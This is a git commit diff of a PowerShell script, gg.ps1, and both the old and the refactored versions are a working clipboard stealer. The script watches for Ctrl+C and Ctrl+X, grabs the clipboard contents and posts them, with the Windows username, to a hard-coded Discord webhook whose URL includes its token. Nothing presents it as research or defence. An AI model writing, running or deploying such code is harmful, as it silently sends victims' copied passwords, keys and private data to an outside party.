f0c7f282c2b16faa9d4152602fa5f273fff99bc0
Mxfire0324 <162410399+Mxfire0324@users.noreply.github.com>
2024-03-20 15:58:53 +0530

    Update gg.ps1

--- gg.ps1
+++ gg.ps1
@@ -1,36 +1,45 @@
 Add-Type -AssemblyName WindowsBase
-	Add-Type -AssemblyName PresentationCore
-	
-	function dischat {
-	
-	  [CmdletBinding()]
-	  param (    
-	  [Parameter (Position=0,Mandatory = $True)]
-	  [string]$con
-	  ) 
-	  
-	  $hookUrl = 'https://discord.com/api/webhooks/1213786836598784012/dk1zfoVl_1rOxQqQ1Z2Z6Hr-xYMi4HKwsKO5cBpQvSoUvDJZBScoT-NGMROLTSz3R2ZH'
-	  
-	$Body = @{
-	  'username' = $env:username
-	  'content' = $con
-	}
-	
-	
-	Invoke-RestMethod -Uri $hookUrl -Method 'post' -Body $Body
-	
-	}
-	
-	
-	dischat (get-clipboard)
-	
-	for {
-		$Lctrl := [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::'LeftCtrl')
-		$Rctrl := [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightCtrl)
-		$cKey := [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::c)
-		$xKey := [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::x)
-	
-		   if (($Lctrl -or $Rctrl) -and ($xKey -or $cKey)) {dischat (Get-Clipboard)}
-		   elseif ($Rctrl -and $Lctrl) {dischat "---------connection lost----------";exit}
-		   else {start-sleep -milliseconds 100}
-	} 
+Add-Type -AssemblyName PresentationCore
+
+function Send-ToDiscord {
+    [CmdletBinding()]
+    param (    
+        [Parameter(Position=0, Mandatory=$true)]
+        [string]$Content
+    ) 
+
+    $WebhookUrl = 'https://discord.com/api/webhooks/1213786836598784012/dk1zfoVl_1rOxQqQ1Z2Z6Hr-xYMi4HKwsKO5cBpQvSoUvDJZBScoT-NGMROLTSz3R2ZH'
+
+    $Body = @{
+        'username' = $env:username
+        'content'  = $Content
+    }
+
+    Invoke-RestMethod -Uri $WebhookUrl -Method 'Post' -Body $Body
+}
+
+function Check-Clipboard {
+    $ClipboardContent = Get-Clipboard
+
+    if (-not [string]::IsNullOrEmpty($ClipboardContent)) {
+        Send-ToDiscord -Content $ClipboardContent
+    }
+}
+
+while ($true) {
+    $LeftCtrlPressed  = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::LeftCtrl)
+    $RightCtrlPressed = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::RightCtrl)
+    $CKeyPressed      = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::C)
+    $XKeyPressed      = [Windows.Input.Keyboard]::IsKeyDown([System.Windows.Input.Key]::X)
+
+    if (($LeftCtrlPressed -or $RightCtrlPressed) -and ($CKeyPressed -or $XKeyPressed)) {
+        Check-Clipboard
+    }
+    elseif ($RightCtrlPressed -and $LeftCtrlPressed) {
+        Send-ToDiscord -Content "--------- Connection Lost ----------"
+        exit
+    }
+    else {
+        Start-Sleep -Milliseconds 100
+    }
+}
